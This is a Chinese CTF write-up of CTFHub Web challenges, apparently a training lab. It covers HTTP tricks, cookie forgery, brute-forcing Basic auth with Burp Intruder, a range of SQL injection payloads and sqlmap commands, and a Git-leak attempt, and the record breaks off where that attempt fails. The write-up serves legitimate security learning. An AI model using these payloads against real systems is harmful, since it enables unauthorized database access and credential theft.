# Web

## HTTP协议

### 请求方式

> HTTP 请求方法，HTTP/1.1协议中共定义了八种方法（也叫动作）来以不同方式操作指定的资源。

进入靶机后看到信息如下：

> HTTP Method is GET
>
> Use CTF**B Method, I will give you flag.
>
> Hint: If you got 「HTTP Method Not Allowed」 Error, you should request index.php.

直接用`curl`命令即可，`-X`参数指定HTTP请求的方法为CTFHUB，-v参数是启用详细模式，本题可省略。

```
┌──(t0ur1st㉿kali)-[~]
└─$ curl -v -X CTFHUB http://challenge-96b75f3f07efdaed.sandbox.ctfhub.com:10800/index.php
* Host challenge-96b75f3f07efdaed.sandbox.ctfhub.com:10800 was resolved.
* IPv6: (none)
* IPv4: 47.98.117.93
*   Trying 47.98.117.93:10800...
* Connected to challenge-96b75f3f07efdaed.sandbox.ctfhub.com (47.98.117.93) port 10800
* using HTTP/1.x
> CTFHUB /index.php HTTP/1.1
> Host: challenge-96b75f3f07efdaed.sandbox.ctfhub.com:10800
> User-Agent: curl/8.15.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Server: openresty/1.21.4.2
< Date: Thu, 08 Jan 2026 12:33:34 GMT
< Content-Type: text/html; charset=UTF-8
< Transfer-Encoding: chunked
< Connection: keep-alive
< X-Powered-By: PHP/5.6.40
< Access-Control-Allow-Origin: *
< Access-Control-Allow-Headers: X-Requested-With
< Access-Control-Allow-Methods: *
< 
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"/>
    <title>CTFHub HTTP Method</title>
</head>
<body>

good job! ctfhub{556a00d7be5d8caf8773e4ef}

</body>
</html>
* Connection #0 to host challenge-96b75f3f07efdaed.sandbox.ctfhub.com left intact
```

提交`ctfhub{556a00d7be5d8caf8773e4ef}`即可。

------

### 302跳转

> HTTP临时重定向

关键源码如下：

```html
<h1>No Flag here!</h1>
<a href="index.php">Give me Flag</a>
```

用`Burp Suite`抓包，点击链接访问`index.php`，右键`Send to Repeater`。

```
GET /index.php HTTP/1.1
Host: challenge-d9cf5f93fb9d1890.sandbox.ctfhub.com:10800
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-d9cf5f93fb9d1890.sandbox.ctfhub.com:10800/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
```

在`Repeater`中点击`Send`可以在`Response`中看到`flag`。

```
HTTP/1.1 302 Moved Temporarily
Server: openresty/1.21.4.2
Date: Thu, 08 Jan 2026 12:45:38 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
X-Powered-By: PHP/5.6.40
Location: /index.html
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 33

ctfhub{fbb1a1cc576a92515e8dd8e9}
```

提交`ctfhub{fbb1a1cc576a92515e8dd8e9}`即可。

------

### Cookie

> Cookie欺骗、认证、伪造

进入靶机后看到信息：

> hello guest. only admin can get flag.

用`Burp Suite`抓包，可以看到`Cookie: admin=0`，将其修改为`admin=1`再放行即可。

```
GET / HTTP/1.1
Host: challenge-1fd496e78b469c94.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: admin=0
Connection: keep-alive
```

或者可以用`HackBar`添加`HEADER`，Name是`Cookie`，Value是`admin=1`，访问靶机也能拿到`flag`。

提交`ctfhub{10c2c42641db9d17a3d75a66}`即可。

------

### 基础认证

> 在HTTP中，基本认证（英语：Basic access authentication）是允许http用户代理（如：网页浏览器）在请求时，提供 用户名 和 密码 的一种方式。详情请查看https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81

下载题目附件，解压缩后得到文件`10_million_password_list_top_100.txt`。fine，密码表。

进入靶机后看到的网页如下：

```html
<h1>CTFHub 基础认证</h1>
<div>
    Here is your flag: <a href="/flag.html">click</a>
</div>
```

点击`/flag.html`会弹出登录窗口，需要输入账号和密码进行登录。

用`Burp Suite`抓包，我们先尝试输入账号`admin`，密码`1`，抓包的信息如下：

```
GET /flag.html HTTP/1.1
Host: challenge-34c1f78d7a59115c.sandbox.ctfhub.com:10800
Cache-Control: max-age=0
Authorization: Basic YWRtaW46MQ==
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://challenge-34c1f78d7a59115c.sandbox.ctfhub.com:10800/
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: keep-alive
```

可以看到`Authorization`中的值包含`base64`编码`YWRtaW46MQ==`。

用`python`编写代码进行`base64`解码后，发现其值为`admin:1`，也就是说账号和密码通过`:`连接起来再进行`base64`编码的值就是`Authorization`传递的一部分。

```python
>>> from base64 import b64decode
>>> b64decode('YWRtaW46MQ==')
b'admin:1'
```

回到`Burp Suite`，右键`Send to Intruder`，选中`YWRtaW46MQ==`后点击Add。

在`Payload configuration`中点击`Load`，选择`10_million_password_list_top_100.txt`文件。

在`Payload processing`中点击`Add`，选择`Add prefix`，填写前缀为`admin:`后确认。

继续在`Payload processing`中点击`Add`添加规则，选择`Encode`中的`Base64-encode`后确认。

接着在`Payload encoding`中取消勾选`URL-encode these characters`。

在上述准备工作完成后，点击`Start attack`发起密码爆破攻击。

查看结果时，我们看到Payload为`YWRtaW46YWNjZXNz`时，Status Code为200，很明显这次登录成功啦，其`base64`解码为`admin:access`。点击查看详情，在`Response`中可以看到以下信息。

```
HTTP/1.1 200 OK
Server: openresty/1.21.4.2
Date: Thu, 08 Jan 2026 13:14:05 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Last-Modified: Thu, 08 Jan 2026 12:56:53 GMT
ETag: W/"695fa995-21"
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
Access-Control-Allow-Methods: *
Content-Length: 33

ctfhub{0e37de3ba19b1c3f4e465bfc}
```

提交`ctfhub{0e37de3ba19b1c3f4e465bfc}`即可。

------

### 响应包源代码

> HTTP响应包源代码查看

进入靶机后是一个简易版的贪吃蛇小游戏，右键查看网页源码，在注释中发现关键字符串。

```html
<body>
    <canvas id="canvas" width="1000" height="700"></canvas>
    <div>
        <input id="switch" type="button" value="開始" onclick="clickSwitch()"></input><br/>
        <input id="content" type="text" value="0"></input>
    </div>
</body>
<!-- ctfhub{8a27b92e58a2121b04dc4814} -->
```

直接用`curl`也很容易就看到`flag`。提交`ctfhub{8a27b92e58a2121b04dc4814}`即可。

------

## SQL注入

Web应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到SQL查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况。这种攻击被称为**SQL注入攻击**。

大多数应用在开发时将诸如密码等的数据放在数据库中，由于SQL注入攻击能够泄露系统中的敏感信息，使之成为了进入各Web系统的入口级漏洞，因此各大CTF赛事将SQL注入作为Web题目的出题点之一，SQL注入漏洞也是现实场景下最常见的漏洞类型之一。

**SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库的原有信息泄露、篡改，甚至被删除。**

### 整数型SQL注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="flag"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/5.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(flag) from sqli.flag
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/6.png)

提交`ctfhub{b797799cfa5883e9255774f0}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/7.png)

------

### 字符型注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`，可以看到是`ID`是字符型。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/1.png)

`database()`回显当前连接的数据库，用`#`注释掉后面的那一个`'`，输入以下代码可以查询到当前数据库为`sqli`：

```sql
-1' union select 1,database()#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1' union select 1,group_concat(flag) from sqli.flag#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/5.png)

提交`ctfhub{7c61389921cf96d14f3df6f9}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/6.png)

------

### 报错注入

**某些网站为了方便开发者调试会开启错误调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。**

输入1试试？输入1后只有一行回显：查询正确。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/1.png)

通过查阅相关文档可知`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。`database()`回显当前连接的数据库，输入以下代码可以查询到当前数据库：

```sql
1 and (updatexml(1,concat(0x7e,(database()),0x7e),1))
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag')  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(flag) from sqli.flag)  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/5.png)

提交`ctfhub{ce93ca39df4e9cbeee0c79c5}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/6.png)

------

### 布尔盲注

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

爆破出当前数据库的名字。

```sql
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" --current-db
#可以得到如下有用的结果信息(简洁版)
current database: 'sqli'
```

得到数据库名后继续爆破表信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
#可以得到如下有用的结果信息(简洁版)
+------+
| flag |
+------+
| news |
+------+
```

知道有个叫`flag`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns
#可以得到如下有用的结果信息(简洁版)
+-----------------------+
| Column | Type         |
+-----------------------+
| flag   | varchar(100) |
+-----------------------+
```

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag -C flag --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{64a098acea7e72aefc09810f} |
+----------------------------------+
```

提交`ctfhub{64a098acea7e72aefc09810f}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/布尔盲注/1.png)

------

### 时间盲注

时间盲注攻击是利用`sleep()`或`benchmark()`等函数让`mysql`执行时间变长，经常与`if(expr1,expr2,expr3)`语句结合使用，通过页面的响应时间来判断条件是否正确。`if(expr1,expr2,expr3)`含义是：如果`expr1`为`True`则返回`expr2`，否则返回`expr3`。

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

```sql
sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{661f441db8300ee13ac86d2b} |
+----------------------------------+
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/时间盲注/1.png)

提交`ctfhub{661f441db8300ee13ac86d2b}`即可。

------

### MySQL结构

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```bash
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`dmyireyrij`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="dmyireyrij"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/5.png)

上图查询到表`dmyireyrij`中有个列叫`wqnbddiwzu`，最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(wqnbddiwzu) from sqli.dmyireyrij
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/6.png)

提交`ctfhub{a251a62c47aa8b3c139cf2e4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/7.png)

------

### Cookie注入

**解法1：**`Burp Suite`

首先用`Burp Suite`抓包`id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F`进行`url`解码结果为`id输入1试试？`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Cookie`为以下代码可以查询到当前数据库为`sqli`：

```sql
id=-1 union select 1, database();
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`gsilsvtvjn`，我们可以去查询该表的列信息：

```sql
id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='gsilsvtvjn';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/4.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
id=-1 union select 1, group_concat(ywcxnnlyfe) from sqli.gsilsvtvjn;
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/5.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/6.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/7.png)

爆破出当前数据库的名字：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/8.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/9.png)

知道有个叫`gsilsvtvjn`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/10.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn -C ywcxnnlyfe --dump 
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/11.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

------

### UA注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`User-Agent`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`ulxbfmsgqx`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='ulxbfmsgqx'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/3.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(zpmjyijptn) from sqli.ulxbfmsgqx
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/4.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/8.png)

知道有个叫`ulxbfmsgqx`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/9.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx -C zpmjyijptn --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/10.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。


------

### Refer注入

#### 解法1：`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Referer`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`dirxpetuan`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='dirxpetuan'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/3.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(jfsxcgbxrx) from sqli.dirxpetuan
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/4.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/5.png)

------

#### 解法2：`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/8.png)

知道有个叫`dirxpetuan`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/9.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan -C jfsxcgbxrx --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/10.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

------

### 过滤空格

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/1.png)

当`sql`中的空格被过滤时可以用`/**/`来代替。`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1/**/union/**/select/**/1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`nbadikctna`，我们可以去查询该表的列信息：

```bash
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='nbadikctna'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/4.png)

最后输入以下代码根据`vuafekfves`字段可以查询到该字段的数据：

```sql
-1/**/union/**/select/**/1,group_concat(vuafekfves)/**/from/**/sqli.nbadikctna
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/5.png)

提交`ctfhub{12917a7f5475c0de901aec7c}`即可。

------

## 信息泄露

### Git泄露

#### Log

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

根据题目描述使用`GitHack`获取`.git`文件夹。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/BugScanTeam/GitHack.git

┌──(tyd㉿Kali)-[~/ctf]
└─$ cd GitHack   

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                            
 / ___(_) |_| | | | __ _  ___| | __                                        
| |  _| | __| |_| |/ _` |/ __| |/ /                                        
| |_| | | |_|  _  | (_| | (__|   <                                         
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                 
 A '.git' folder disclosure exploit.                                       
                                                                           
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/                                                                      
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
